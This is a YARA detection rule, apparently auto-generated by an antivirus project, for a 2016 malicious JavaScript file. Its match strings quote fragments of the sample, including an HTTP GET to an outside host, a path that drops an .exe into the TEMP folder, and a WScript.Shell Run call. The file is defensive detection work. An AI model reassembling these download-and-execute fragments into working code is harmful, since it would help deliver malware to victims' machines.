rule sig_20160329_3208483602d453b7c173b62d1e9cbfee {
  meta:
    description = "datamaliciousorder - file 20160329_3208483602d453b7c173b62d1e9cbfee.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "18e9ab965dcfed0b81de6de966e09580f1ce04e475be5a91db8b49881949d27f"

  strings:
    $s1  = "Rg[R](\"GET\", \"http://aztechnologies.co.uk/sdj3oa\", false);" fullword ascii
    $s2  = "function T() {return N[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"UXy7MZEaOLIgC.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[JX](hx() * 11); if (Rg[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function k(nw, I0){h0 = h0 * 1; return nw - I0;};" fullword ascii
    $s5  = "var N = function F() {return WScript[pP](\"WScript.Shell\");}(), j = 11;" fullword ascii
    $s6  = "function gV(){return \"\" + I;};" fullword ascii
    $s7  = "function w(PR){N[\"Run\"](PR, h0, h0);};" fullword ascii
    $s8  = "function A() {return ((t0 == true) && (t0 == kb)) ? 1 : h0;};" fullword ascii
    $s9  = "return k(o, yh);" fullword ascii
    $s10 = " while (pf){" fullword ascii
    $s11 = "function g(z) {var t = (1, 2, 3, 4, 5, z); return t;};" fullword ascii
    $s12 = "var K = new this[\"Date\"]();" fullword ascii
    $s13 = "function qv()" fullword ascii
    $s14 = "function hx(){return 22;};" fullword ascii
    $s15 = "function D(){return pP;};" fullword ascii
    $s16 = "var kb = false;" fullword ascii
    $s17 = "kb = true; " fullword ascii
    $s18 = "t0 = true; " fullword ascii
    $s19 = "var t0 = false;" fullword ascii
    $s20 = "var z0 = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}